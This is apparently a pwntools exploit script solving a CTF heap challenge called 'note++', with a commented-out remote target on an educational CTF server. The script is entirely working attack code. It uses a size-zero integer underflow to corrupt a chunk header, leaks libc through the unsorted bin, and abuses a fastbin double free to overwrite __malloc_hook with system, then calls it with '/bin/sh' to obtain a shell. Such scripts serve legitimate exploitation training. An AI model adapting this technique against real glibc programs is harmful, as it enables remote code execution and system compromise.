# python 2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# chunk malloc hook
# r = remote('edu-ctf.csie.org', 10178)
r = process('./note++')
libc = ELF('./libc.so', checksec=False)


def add(size, note, description):
    r.recvuntil('>')
    r.sendline('1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('Note: ', str(note))
    r.sendlineafter('note: ', str(description))

def show():
    r.recvuntil('>')
    r.sendline('2')

def delete(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.sendlineafter('Index: ', str(idx))

add(0x18, '\x18', '\x18') # n0
add(0x77, '\x78', '\x78') # n1
add(0x18, '\x18', '\x18') # n2
add(0x18, '\x18', '\x18') # n3

delete(0)

# make n1 size grow up to 0x90 (small bin) to be thrown to unsorted bin
# -1 --> unsigned int --> overflow
p = ''
p += (p64(0xdaddbeef))
p += (p64(0xdaddbeef))
p += (p64(0x0))
p += (p64(0xa1)) # make n1 small bin
add(0x0, p, '\x87' * 48)

# fastbin[0x20] --> n[0]
# unsorted bin --> n[1]
delete(0)
delete(1)

# buff n[0] to make n[1], is_freed flag printable
add(0x18, '\x18' * 8, '\x18' * 0x30) # n0
show()

r.recvuntil('Note 1:\n  Data: ')
libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
print('libc_base --> ', hex(libc_base))

add(0x58, '\xaa' * 8, '\xaa' * 0x30) # n4
add(0x58, '\xaa' * 8, '\xbb' * 0x30) # n5
delete(4)
delete(5)

# self-opening another place to do double free shit
delete(2)
delete(3)
add(0x18, '\xaa' * 8, '\xaa' * 0x2f) # n4
add(0x18, '\xaa' * 8, '\xbb' * 0x30) # n5
delete(4)

malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13# shift for 0x7f like padding
add(0x58, p64(malloc_hook), 'MALLOC_HOOK')
add(0x58, '\x18', '\x87' * 48)
add(0x58, '\x18', '\x87' * 48)

binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym.system
add(0x58, p64(system), 'BIN_SH')

r.recvuntil('>')
r.sendline('1')
r.sendlineafter('Size: ', p64(binsh))
r.interactive()
